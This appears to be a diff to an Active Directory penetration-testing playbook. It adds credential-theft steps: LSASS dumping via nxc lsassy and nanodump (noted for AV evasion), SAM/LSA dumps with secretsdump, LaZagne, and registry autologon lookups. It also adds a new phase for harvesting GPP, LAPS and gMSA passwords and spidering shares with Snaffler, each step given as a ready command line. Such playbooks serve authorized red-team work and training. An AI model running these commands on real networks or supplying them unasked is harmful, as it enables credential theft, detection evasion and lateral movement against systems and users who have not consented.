@@ -98,12 +98,18 @@ Before touching the network:
 
   Dump LSASS (hashes, tickets, plaintext):
     → [LSASS Dumping](../../credential-abuse/lsass-dumping/lsass-dumping.md)
+    → nxc -M lsassy (remote, in-memory, stealthy)
+    → nxc -M nanodump (syscalls, AV evasion)
 
-  Dump SAM (local account hashes):
-    → secretsdump / reg save
+  Dump SAM + LSA in one shot:
+    → nxc smb <target> --sam --lsa
+    → secretsdump.py <domain>/<user>:<pass>@<target>
 
   Hunt for saved creds, DPAPI, browser passwords, vaults:
     → [Credential Hunting](../../../03-post-exploitation/credential-hunting/credential-hunting.md)
+    → LaZagne.exe all (pulls from everything on the box)
+    → Autologon creds in registry (Winlogon DefaultPassword)
+    → Unattend.xml / sysprep.xml (deployment leftovers)
 
   Cached domain creds (DCC2)? Crack them offline:
     → [Hashcat](../../../00-general/password-cracking/hashcat/hashcat.md)
@@ -114,7 +120,35 @@ Before touching the network:
   ├─ NTLM hash      → Phase 5 (pass-the-hash)
   ├─ Kerberos TGT   → Phase 5 (pass-the-ticket)
   ├─ Cleartext pass  → Phase 5 (direct auth / spraying)
-  └─ Nothing useful  → Phase 6 (AD enum for other paths)
+  └─ Nothing useful  → Phase 4b (cred hunting) then Phase 6
+
+
+========================================================================
+ PHASE 4b — CREDENTIAL HUNTING (no admin needed)
+========================================================================
+
+  Before going to full AD enum, check these easy wins — they don't
+  need local admin and are often overlooked:
+
+  Passwords in user descriptions?
+    → nxc ldap <dc-ip> -u <user> -p <pass> -M get-desc-users
+
+  GPP passwords (old Group Policy Preferences)?
+    → nxc smb <dc-ip> -u <user> -p <pass> -M gpp_password
+
+  LAPS passwords readable?
+    → nxc ldap <dc-ip> -u <user> -p <pass> --laps
+
+  gMSA passwords readable?
+    → nxc ldap <dc-ip> -u <user> -p <pass> --gmsa
+    → gMSADumper.py -u <user> -p <pass> -d <domain>
+
+  Creds in shares (scripts, configs, KeePass DBs)?
+    → nxc smb <target> -u <user> -p <pass> --spider-shares
+    → Snaffler.exe -s -o snaffler.log (from Windows foothold)
+
+  Got something? → Phase 5 (lateral movement)
+  Still nothing? → Phase 6 (AD enum for escalation paths)
 
 
 ========================================================================
